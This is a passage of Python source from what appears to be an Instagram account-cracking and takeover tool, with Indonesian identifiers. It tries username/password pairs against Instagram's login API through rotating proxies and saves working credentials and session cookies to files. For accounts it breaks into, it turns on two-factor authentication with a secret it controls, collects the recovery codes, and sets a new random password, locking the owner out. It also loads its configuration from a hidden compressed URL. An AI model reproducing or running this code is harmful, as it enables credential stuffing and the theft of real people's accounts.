4IC\nAQB8cMqTllHc8U+qCrOlg3H7174lmaCsbo\/bJ0C17JEgMLb4kvrqsXZs01U3mB\/qABg\/1t5Pd5AO\nRHARs1hhqGICW\/nKMav574f9rZN4PC2ZlufGXb7sIdJpGiO9ctRhiLuYuly10JccUZGEHpHSYM2G\ntkgYbZba6lsCPYAAP83cyDV+1aOkTf1RCp\/lM0PKvmxYN10RYsK631jrleGdcdkxoSK\/\/mSQbgcW\nnmAEZrzHoF1\/0gso1HZgIn0YLzVhLSA\/iXCX4QT2h3J5z3znluKG1nv8NQdxei2DIIhASWfu804C\nA96cQKTTlaae2fweqXjdN1\/v2nqOhngNyz1361mFmr4XmaKH\/ItTwOe72NI9ZcwS1lVaCvsIkTDC\nEXdm9rCNPAY10iTunIHFXRh+7KPzlHGewCq\/8TOohBRn0\/NNfh7uRslOSZ\/xKbN9tMBtw37Z8d2v\nvnXq\/YWdsm1+JLVwn6yYD\/yacNJBlwpddla8eaVMjsF6nBnIgQOf9zKSe06nSTqvgwUHosgOECZJ\nZ1EuzbH4yswbt02tKtKEFhx+v+OTge\/06V+jGsqTWLsfrOCNLuA8H++z+pUENmpqnnHovaI47gC+\nTNpkgYGkkBT6B\/m\/U01BuOBBTzhIlMEZq9qkDWuM2cA5kW5V3FJUcfHnw1IdYIg2Wxg7yHcQZemF\nQg==\n-----END CERTIFICATE-----"}]}'
               }

               self.encrypt = self.EncryptionPassword(public_key, key_id, password)
               self.payload = {
                  'params': '{"client_input_params":{"contact_point":"'+users+'","password":"'+self.encrypt+'","event_flow":"account_recovery","family_device_id":"'+self.headers['x-ig-family-device-id']+'","machine_id":"'+self.headers['x-mid']+'","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'+self.headers['x-ig-android-id']+'","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'+self.headers['x-ig-family-device-id']+'","credential_type":"password","waterfall_id":"'+str(uuid.uuid4())+'","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'+self.headers['x-ig-android-id']+'","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}',
                  'bk_client_context': '{"bloks_version":"'+signature_bloks+'","styles_id":"instagram"}',
                  'bloks_versioning_id': signature_bloks
               }
               self.prox = {'http': random.choice(self.PROXY['proxi'])}
               self.sign = self.qw.post(f'https://{self.api}/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.payload, headers=self.headers, proxies=self.prox,allow_redirects=True)
               if 'logged_in_user' in self.sign.text.replace('\\',''):
                   self.bearer = re.search('"Bearer IGT:2:(.*?)"', self.sign.text.replace('\\','')).group(1)
                   self.cokies = 'mid=%s;'% self.md + self.CookieBearer(self.bearer)
                   self.kontol = self.friends_user(self.cokies)
                   if 'pw_kham' in str(self.kontol):self.kontol = self.friends_user_chek(users)
                   self.facebook = self.Fafo(self.cokies)
                   tree = Tree('\r[white]╭ [green]logged in user                                          ',style='green')
                   tree.add(f'{users}|{password}')
                   tree.add(f'{self.kontol[0]}|{self.kontol[1]}')
                   tree.add(f'{self.facebook[0]}|{self.facebook[1]}')
                   tree.add(f'{self.cokies}')
                   Print(tree)
                   print('\r					')
                   self.save = '%s|%s|%s|%s|%s\n'%(users, password, self.kontol[0], self.kontol[1], self.cokies)
                   open(self.ok,'a').write(self.save)
                   self.ResultSuccess +=1
                   break
               elif 'https://i.instagram.com/challenge/' in self.sign.text.replace('\\','') or 'instagram.com/challenge/' in self.sign.text.replace('\\',''):
                   self.kontol = self.friends_user_chek(users)
                   tree = Tree('\r[white]╭ [yellow]challenge                                          ',style='yellow')
                   tree.add(f'{users}|{password}')
                   tree.add(f'{self.kontol[0]}|{self.kontol[1]}')
                   Print(tree)
                   print('\r                                    ')
                   self.save = '%s|%s|%s|%s\n'%(users, password, self.kontol[0], self.kontol[1])
                   open(self.cp,'a').write(self.save)
                   self.ResultChechpoint +=1
                   break
           except (requests.exceptions.ConnectionError):
               time.sleep(30)
               self.x_recovery_app(users, [password])
       self.Loop +=1

   def data_graph(self, xxx):
       data = {
           'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
           '__d': 'www',
           '__user': '0',
           '__a':'1',
           '__req': 'h',
           '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
           'dpr': '2',
           '__ccg': 'GOOD',
           '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
           '__s': '',
           '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
           '__dyn': '',
           '__csr': '',
           '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
           'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
           'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
           'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
           '__spin_b': 'trunk',
           '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
           'fb_api_caller_class': 'RelayModern',
           'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
           'server_timestamps': 'true',
           'doc_id': '6888165191230459'
       }
       return(data)

   def headers_graph(self, xxx):
       headers = {
           'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
           'x-ig-app-id': '1217981644879628',
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
           'content-type': 'application/x-www-form-urlencoded',
           'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           'accept': '*/*',
       }
       return(headers)

   def TahapPertama2f(self, cokie, url = 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
       try:
           resp = requests.Session().get(url, cookies = {'cookie': cokie}).text
           head = self.headers_graph(resp)
           head.update({
               'Host': 'accountscenter.instagram.com',
               'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
               'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'content-type': 'application/x-www-form-urlencoded',
               'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
               'x-ig-app-id': '1217981644879628',
           })
           data = self.data_graph(resp)
           data.update({
               'fb_api_caller_class':'RelayModern',
               'fb_api_req_friendly_name':'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'variables':json.dumps({"input":{"client_mutation_id":f"{self.ClientId(resp)}","actor_id":f"{self.AccountId(resp)}","account_id":f"{self.AccountId(resp)}","account_type":"INSTAGRAM","device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),
               'doc_id':'6282672078501565',
           })
           get_p = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies = {'cookie':cokie}).text
           if "totp_key" in str(get_p):
              xnxx = re.search('"key_text":"(.*?)"', str(get_p)).group(1)
              hpsx = xnxx.replace(' ','')
              kode = requests.get(f'https://2fa.live/tok/{hpsx}').json()['token']
              self.info.update({'SecretKey':hpsx})
              self.AktifkanA2f(cokie, kode, resp, hpsx)
           else:
              self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       return self.info

   def AktifkanA2f(self, cokie, code, resp, auth):
       try:
           xxx, ua = resp, 'Instagram 163.0.0.45.122 Android (28/9; 440dpi; 1080x2130; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; ru_RU; 250742113)'
           head = self.headers_graph(resp)
           head.update({
              'Host': 'accountscenter.instagram.com',
              'x-ig-app-id': '1217981644879628',
              'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
              'content-type': 'application/x-www-form-urlencoded',
              'user-agent': ua,
              'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation',
           })
           data = {'av':self.AccountId(resp),'__user':'0','__a':'1','__req':'14','__hs':re.search('"haste_session":"(.*?)"', str(xxx)).group(1),'dpr':'2','__ccg':'GOOD','__rev':re.search('{"rev":(.*?)}',str(xxx)).group(1),'__hsi':re.findall('"hsi":"(\d+)"',str(xxx))[0],'__comet_req':'24','fb_dtsg':re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),'jazoest':re.findall('&jazoest=(\d+)',str(xxx))[0],'lsd':re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),'__spin_r':re.findall('"__spin_r":(\d+)', str(xxx))[0],'__spin_b':'trunk','__spin_t':re.findall('"__spin_t":(\d+)', str(xxx))[0],'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'useFXSettingsTwoFactorEnableTOTPMutation','variables':json.dumps({"input":{"client_mutation_id":re.search('{"clientID":"(.*?)"}',str(resp)).group(1),"actor_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_type":"INSTAGRAM","verification_code":code,"device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),'server_timestamps':'true','doc_id':'7032881846733167'}
           ondw = requests.Session().post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cokie}).text
           if '"success":true' in str(ondw):
              self.info.update({'success-a2f':True})
              reco = self.get_code(cokie, resp)
              if reco is not None:
                 try:
                     kode = reco['data']['xfb_two_factor_regenerate_recovery_codes']['recovery_codes']
                     self.info.update({'kode-pemulihan':kode})
                 except:
                     self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
              else:self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
           else:
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak ada'})

   def AccountId(self, xxx):
       try:
           Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
           return(Userid)
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.AccountId(xxx)

   def ClientId(self, xxx):
       try:
           Clients = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
           return Clients
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.ClientId(xxx)

   def get_code(self, cokie, response):
       try:
           data = self.data_graph(response)
           clin = self.ClientId(response)
           user = data['av']
           data.update({'__req':'t','__s':'','__dyn':'','__csr':'','fb_api_req_friendly_name':'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation','variables':'{"input":{"client_mutation_id":"'+clin+'","actor_id":"'+user+'","account_id":"'+user+'","account_type":"INSTAGRAM","fdid":"device_id_fetch_ig_did"}}','doc_id':'24010978991879298'})
           head = self.headers_graph(response)
           head.update({
               'Host': 'accountscenter.instagram.com',
               'sec-ch-ua': 'Not_A',
               'x-ig-app-id': '936619743392459',
               'sec-ch-ua-mobile': '?0',
               'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
               'viewport-width': '980',
               'x-fb-friendly-name': 'useFXSettingsTwoFactorFetchRecoveryCodesMutation',
               'x-fb-lsd': '7g42wKUg5uJbzrClbnTyuB',
               'content-type': 'application/x-www-form-urlencoded',
               'x-asbd-id': '129477',
               'dpr': '2',
               'sec-ch-ua-full-version-list': 'Not_A',
               'sec-ch-prefers-color-scheme': 'light',
               'sec-ch-ua-platform': 'Linux',
               'accept': '*/*',
               'origin': 'https://accountscenter.instagram.com',
               'sec-fetch-site': 'same-origin',
               'sec-fetch-mode': 'cors',
               'sec-fetch-dest': 'empty',
               'referer': 'https://accountscenter.instagram.com/password_and_security/two_factor/',
               'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',})
           reqs = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cokie}, data=data, headers=head).json()
           return reqs
       except Exception as e:
           return None

   def OverPower(self):
       while True:
         try:
             self.uid = str(uuid.uuid4())
             self.ps  = requests.get(zlib.decompress(KamuNya)).json()

             self.XyraaCodeDev.update({'data':self.ps['xyraacode']['MidConfig'],'curl':self.ps['CURLpost']['xyraacodeURL'],'meta':self.ps['Headers']['xyraacodeHEAD']})
             self.data = self.XyraaCodeDev['data']
             self.data.update({
                  'device_id':'android-%s'%(self.Android_ID('null','null').hexdigest()[:16]),
                  'custom_device_id':str(self.uid),
                }
             )
             self.meta = self.XyraaCodeDev['meta']
             self.meta.update({
                  'x-ig-device-id': str(self.uid),
                  'x-ig-android-id': str(self.data['device_id']),
                  'x-ig-timezone-offset': str(self.timezone_offset()),
                  'content-length': str(len(self.data))
                }
             )
             self.resp = requests.post(self.XyraaCodeDev['curl'], data=self.data, headers=self.meta)
             self.appc = self.resp.headers['ig-set-x-mid']
             if self.appc not in self.MID:
                if len(self.MID) <6:
                   self.MID.append(self.appc)
                else: break
         except: break

   def PasswordNEW(self):
       self.abd = ['ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz']
       self.san = ''.join(random.choice(random.choice(self.abd)) for _ in range(12))
       return(self.san)

   def SandiBaru(self, cookie, old_pw):
       try:
            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cookie}).text
            head = self.headers_graph(resp)
            head.update({'Host': 'accountscenter.instagram.com','x-fb-friendly-name': 'useFXSettingsChangePasswordMutation','user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',})
            data      = self.data_graph(resp)
            old_pwx   = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),old_pw)
            self.sand = self.PasswordNEW()
            new_pw    = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),self.sand)
            data.update({'fb_api_req_friendly_name': 'useFXSettingsChangePasswordMutation','variables': '{"account_id":"'+data['av']+'","account_type":"INSTAGRAM","current_password_enc":{"sensitive_string_value":"'+str(old_pwx)+'"},"new_password_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"new_password_confirm_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"client_mutation_id":"'+self.ClientId(resp)+'","should_logout":false}','doc_id': '6616377658461852',})
            respon = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cookie}, data=data, headers=head).text
            if '"success":true' in str(respon):return new_pw.split(':')[3]
            else:return old_pwx.split(':')[3]
       except:return old_pw
